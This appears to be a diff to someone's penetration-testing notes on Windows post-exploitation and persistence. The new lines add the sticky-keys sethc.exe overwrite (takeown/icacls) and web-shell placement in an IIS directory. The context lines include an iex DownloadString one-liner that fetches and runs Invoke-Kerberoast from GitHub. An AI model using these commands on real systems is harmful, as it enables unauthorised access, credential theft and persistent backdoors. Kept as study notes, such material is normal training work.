@@ -1,10 +1,12 @@
 - [Commands](#commands)
-  - [Stabilize /Post Exploit / Persistance windows](#stabilize-post-exploit--persistance-windows)
+  - [Stabilize / Post Exploit / Persistance windows](#stabilize--post-exploit--persistance-windows)
     - [Tampering with low users](#tampering-with-low-users)
     - [Backdoor](#backdoor)
     - [Create/Modfiy Services](#createmodfiy-services)
     - [Schedule Tasks](#schedule-tasks)
     - [Logon as Trigger](#logon-as-trigger)
+    - [Login Screen](#login-screen)
+    - [Existing Services](#existing-services)
   - [Powershell](#powershell)
     - [Enumeration](#enumeration)
 - [SMB](#smb)
@@ -36,7 +38,6 @@
     - Recurse
     - Error
   - Test-NetConnection 
-  - 
 
 - Get-CimInstance
   - Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct (workstantion)
@@ -128,7 +129,7 @@
 - Invoke Kereberosast script:
   - iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
   
-## Stabilize /Post Exploit / Persistance windows
+## Stabilize / Post Exploit / Persistance windows
 
 ### Tampering with low users
 - Create user + add group admin
@@ -194,8 +195,6 @@
   -  PsExec64.exe -s -i regedit
   -  Delete task
 
-
-
 ### Logon as Trigger
 - **Executable on startup**
   - Folder User: AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
@@ -224,6 +223,22 @@
   - Variable: UserInitMprLogonScript
   - Assign logon script to user
   - HKCU\Environment ==> add Reg_Expand_Sy
+
+### Login Screen
+- Sticky keys
+  - 5 x shift = C:\Windows\System32\sethc.exe
+  - take ownershipf of file + give permision + overwrite sethc,exe
+    - takeown /f c:\Windows\System32\sethc.exe
+    - icalcs c:\Windows\System32\sethc.exe /grant Administrator:F
+
+- Utilman (patched)
+  - Ease access 
+  - c:\Windows\System32\sethc.exe
+
+### Existing Services
+- web shell to web directory
+- default web server: iis apppool\defaultapppool
+
 
 ## Powershell
 - .NET framkework: software plattform für windows
